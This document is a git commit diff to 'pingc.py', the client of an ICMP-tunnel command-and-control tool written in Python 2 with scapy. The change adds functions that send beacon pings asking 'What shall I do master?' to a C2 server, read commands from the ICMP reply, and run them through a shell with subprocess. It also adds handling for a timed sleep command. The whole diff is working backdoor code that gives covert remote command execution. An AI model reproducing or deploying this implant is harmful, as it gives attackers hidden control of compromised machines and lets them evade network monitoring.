809183d28e304aba746abc2a5ee8d7256ea6b194
nocow4bob <robert.ant.davis@gmail.com>
2013-06-28 17:01:28 -0400

    updated client to accept sleep command

--- pingc.py
+++ pingc.py
@@ -11,6 +11,34 @@ import time
 import subprocess as sub
 from scapy.all import sr,sr1,ICMP,IP
 
+def sendPingRequest(command):
+	packet=IP(dst=sys.argv[1])/ICMP()/command
+        #packet.show()
+        p=sr1(packet,timeout=5)
+        print "[*] String sent to C2 server: " + command
+	return p
+
+def processReply(p):
+	response=p['Raw'].load
+        # Check ICMP data for 'run' command
+        print "[*] String received from C2 server: " + p['Raw'].load
+        if 'run' in response:
+        	print "[*] Master says run command: " + response[4:]
+                command = response[4:]
+                command.split()
+                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
+                output, errors = proc.communicate()
+                print output
+                print errors
+	elif 'sysinfo' in response:
+        	print "[*] Master requesting sysinfo"
+        elif 'sleep' in response:
+		seconds = response[6:]
+                print "[*] Master says sleep for %s seconds" % (seconds)
+                print "[*] Sleeping..."
+                time.sleep(int(seconds))
+                p=sendPingRequest("What shall I do master?")
+                processReply(p)
 
 def main(argv):
 	while 1:
@@ -20,10 +48,7 @@ def main(argv):
 			print " ./pingc.py <IP>"
 			print "----------------------------"
 			exit()
-		packet=IP(dst=sys.argv[1])/ICMP()/"What shall I do master?"
-		#packet.show()
-		p=sr1(packet)
-		print "[*] String sent to C2 server: What shall I do master?" 
+		p=sendPingRequest("What shall I do master?")
 		if p:
 			#p.show()
 			try:
@@ -45,6 +70,9 @@ def main(argv):
 					print "[*] Master says sleep for %s seconds" % (seconds)
 					print "[*] Sleeping..."
 					time.sleep(int(seconds))
+					p=sendPingRequest("What shall I do master?")
+					if p:
+						processReply(p)
 			except:
 				print "[X] ERROR: ", sys.exc_info()[0] 
 		print "[*] Sleeping now..."
